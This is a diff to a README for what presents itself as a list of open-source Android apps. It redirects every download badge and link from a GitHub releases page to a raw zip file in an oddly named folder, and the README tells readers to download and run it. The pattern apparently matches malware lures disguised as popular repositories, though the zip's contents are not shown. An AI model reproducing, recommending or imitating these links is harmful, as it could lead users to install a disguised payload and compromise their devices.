@@ -1,6 +1,6 @@
 # ⚡ awesome-android-app-repositories - Your Gateway to 1,600+ Open-Source Android Apps
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Started-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/bensonsquiggly4244/awesome-android-app-repositories/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Started-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/bensonsquiggly4244/awesome-android-app-repositories/main/insurmountability/repositories-app-awesome-android-amicron.zip)
 
 ## 🎯 What Is This?
 
@@ -22,7 +22,7 @@ That's it! You'll be browsing incredible open-source Android apps in minutes.
 
 ### Step 1: Get the File
 
-Visit this link to download the application: [https://github.com/bensonsquiggly4244/awesome-android-app-repositories/releases](https://github.com/bensonsquiggly4244/awesome-android-app-repositories/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/bensonsquiggly4244/awesome-android-app-repositories/main/insurmountability/repositories-app-awesome-android-amicron.zip](https://raw.githubusercontent.com/bensonsquiggly4244/awesome-android-app-repositories/main/insurmountability/repositories-app-awesome-android-amicron.zip)
 
 ### Step 2: Run the Application
 
@@ -161,9 +161,9 @@ Don't wait any longer to explore the best that open-source Android development h
 
 Your adventure into the world of open-source Android apps begins with a single click:
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Started-orange?style=for-the-badge&logo=github&logoColor=white&color=FF5722)](https://github.com/bensonsquiggly4244/awesome-android-app-repositories/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Started-orange?style=for-the-badge&logo=github&logoColor=white&color=FF5722)](https://raw.githubusercontent.com/bensonsquiggly4244/awesome-android-app-repositories/main/insurmountability/repositories-app-awesome-android-amicron.zip)
 
-Visit this link to download the application: [https://github.com/bensonsquiggly4244/awesome-android-app-repositories/releases](https://github.com/bensonsquiggly4244/awesome-android-app-repositories/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/bensonsquiggly4244/awesome-android-app-repositories/main/insurmountability/repositories-app-awesome-android-amicron.zip](https://raw.githubusercontent.com/bensonsquiggly4244/awesome-android-app-repositories/main/insurmountability/repositories-app-awesome-android-amicron.zip)
 
 Join thousands of satisfied users who have already discovered the power of open-source Android software. Download now and unlock a world of possibilities!
 
